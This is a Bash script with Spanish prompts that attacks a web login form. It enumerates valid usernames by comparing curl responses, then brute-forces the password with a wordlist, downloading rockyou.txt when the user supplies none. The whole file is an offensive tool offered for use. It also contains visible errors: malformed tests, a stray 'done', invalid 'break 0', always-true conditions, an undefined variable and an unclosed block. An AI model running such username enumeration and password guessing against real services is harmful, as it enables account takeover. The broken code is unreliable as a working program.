#!/bin/bash
3_diccionario() {
start=1
URL=$(echo -e "$url")
echo "Dime un usuario o un fichero txt con un listado de usuarios"
read document
#añadir a.txt
ok=0
vale=0
if [ -f  $document ]
then
    echo "Recuerda que este proceso puede tardar minutos."
    total=$(wc -l < $document)
    while [ $start -le $total ]
        do
        test=$(awk "NR==$start{print $1}" $document)
        if [[ $(curl -s -d "username=$test&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
        then
            username=$test
            vale=1
            break 0
        fi
        ((start = start + 1))
    #    echo $start
    done
else
    if [[! $(curl -s -d "username=$document&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
        then
            username=$document
            vale=1
            break 0
        else
            echo "Usuario inexistente."
        fi
        ((start = start + 1))
    #    echo $start
    done
fi
if [[ $vale==1 ]]
then
    echo -e "No hemos podido encontrar un usuario valido."
    exit 1
fi
echo "Quieres utilizar un diccionario de contraseñas en especifico? Indica la ruta del fichero de ser así, si no omite la respuesta."
read document
if [ -f  $document ] 
then
    echo "Fichero valido"
else
    echo "El Fichero no es valido, usaremos un diccionario propio"
    
    wget -q "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
    document=rockyou.txt
start=1
total=$(wc -l < $document)
while [ $start -le $total ]
    do
    test=$(awk "NR==$start{print $1}" $document)
    if ! [[ $(curl -i -s -d "username=$username&password=$test" $URL | grep -e "302 Found") ]]
    then
        password=$test
        ok=1
        break 0
    fi
    ((start = start + 1))
done
if [ -f  rockyou.txt ]
then
    rm rockyou.txt
fi
if [[ $ok==1 ]]
then
    echo -e "El usuario es $usuari y su contraseña és $password ."
else
    echo -e "El usuario es $usuari ."
    echo -e "La contraseña no se encuentra en el diccionario, lo sentimos."
    exit 1
fi
}
